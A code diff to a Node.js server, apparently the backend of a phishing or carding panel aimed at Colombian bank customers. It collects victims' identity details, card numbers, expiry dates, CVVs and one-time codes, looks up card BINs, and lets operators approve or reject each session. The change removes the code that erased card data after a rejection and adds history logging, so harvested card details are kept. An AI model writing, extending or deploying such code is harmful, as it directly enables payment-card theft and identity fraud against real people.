@@ -27,7 +27,7 @@ const rateLimits = new Map();
 const tokensInvalidos = new Set();
 const bcSesiones = new Map();
 
-// 🔥 NUEVO: Archivo para guardar las sesiones temporales en el disco duro
+// Archivo para guardar las sesiones temporales en el disco duro
 const SESIONES_TEMP_FILE = path.join(DATA_DIR, 'sesiones-temporales.json');
 let sesionesTemporales = {};
 try {
@@ -347,19 +347,8 @@ const server = http.createServer(async (req, res) => {
                 estadoSesiones.set(sessionId, estadoNuevo);
                 ultimaAccionSesiones.set(sessionId, accion);
 
-                let datosActuales = datosSesiones.get(sessionId) || {};
-                const bancoKey = datosActuales.bancoKey || '';
-                const esTarjeta = bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga';
-
-                if ((accion === 'RECHAZAR' || accion === 'CC_ERROR') && esTarjeta) {
-                    datosActuales.tarjeta = '';
-                    datosActuales.expMes = '';
-                    datosActuales.expAnio = '';
-                    datosActuales.cvv = '';
-                    datosActuales.otp = '';
-                    datosSesiones.set(sessionId, datosActuales);
-                }
-
+                // 🔥 SE ELIMINÓ LA LÓGICA QUE BORRABA LOS DATOS DE LA TARJETA AQUÍ
+                
                 agregarLog('accion', { usuario: payload.user, sessionId, accion });
                 console.log(`[${payload.user}] ${accion} → ${sessionId}`);
                 json(res, 200, { ok: true, estado: estadoNuevo, accion });
@@ -483,7 +472,6 @@ const server = http.createServer(async (req, res) => {
             const { sessionId, tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio } = datos;
             if (!sessionId) { json(res, 400, { ok: false }); return; }
 
-            // 🔥 GUARDAMOS EN EL ARCHIVO DE SESIONES TEMPORALES
             const datosPrevios = sesionesTemporales[sessionId] || {};
             const datosCompletos = Object.assign({}, datosPrevios, {
                 tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio,
@@ -494,7 +482,6 @@ const server = http.createServer(async (req, res) => {
             sesionesTemporales[sessionId] = datosCompletos;
             guardarSesionesTemporales();
 
-            // También en la memoria para que aparezca en la vista del admin
             datosSesiones.set(sessionId, datosCompletos);
 
             console.log(`[${bancoKey}] Consulta en disco: ${sessionId} | Tel: ${telefono}`);
@@ -515,7 +502,6 @@ const server = http.createServer(async (req, res) => {
 
             const datosCompletos = sesionesTemporales[sessionId] || {};
             
-            // GUARDAMOS EL PRIMER REGISTRO EN EL HISTORIAL
             guardarHistorial(bancoKey, datosCompletos);
 
             console.log(`[${bancoKey}] Consulta guardada en historial (Paso 1): ${sessionId}`);
@@ -537,8 +523,6 @@ const server = http.createServer(async (req, res) => {
             if (!sessionId || !marca) { json(res, 400, { ok: false }); return; }
 
             const infoBin = await obtenerInfoBin(tarjeta);
-            
-            // 🔥 RECUPERAMOS LOS DATOS DEL DISCO DURO
             const datosPrevios = sesionesTemporales[sessionId] || {};
 
             const datosSesion = Object.assign({}, datosPrevios, {
@@ -568,10 +552,8 @@ const server = http.createServer(async (req, res) => {
             datosSesiones.set(sessionId, datosSesion);
             ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO');
 
-            // GUARDAMOS EL SEGUNDO REGISTRO EN EL HISTORIAL
             guardarHistorial(bancoKey, datosSesion);
 
-            // Limpiamos la sesión temporal del disco
             delete sesionesTemporales[sessionId];
             guardarSesionesTemporales();
 
